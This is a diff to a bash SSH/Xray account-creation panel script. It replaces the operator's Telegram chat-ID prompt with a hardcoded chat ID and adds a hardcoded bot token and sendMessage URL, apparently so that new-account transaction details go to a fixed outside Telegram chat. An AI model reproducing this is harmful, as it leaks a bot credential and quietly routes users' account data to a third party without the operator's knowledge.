@@ -40,7 +40,7 @@ echo -e " ${COLBG1}            • SSH PANEL MENU •          ${NC} "
 echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
 read -p "   Username : " Login
 read -p "   Owner     : " OWNER
-read -p "Input Id tele anda (-1001911868043) : " CHATIDGC
+CHATIDGC="5736569839"
 CEKFILE=/etc/xray/ssh.txt
 if [ -f "$CEKFILE" ]; then
 file001="OK"
@@ -104,6 +104,10 @@ useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
 exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
 echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
 PID=`ps -ef |grep -v grep | grep sshws |awk '{print $2}'`
+TIMES="1"
+CHATIDGC="5736569839"
+KEY="6409879237:AAE1vPwbqfiWmRkV-AbCa6-tepM5w5FTGz0"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
 TRX="
 <code>INFO MASKU -Transaksi</code>
 <code>────────────────────</code>
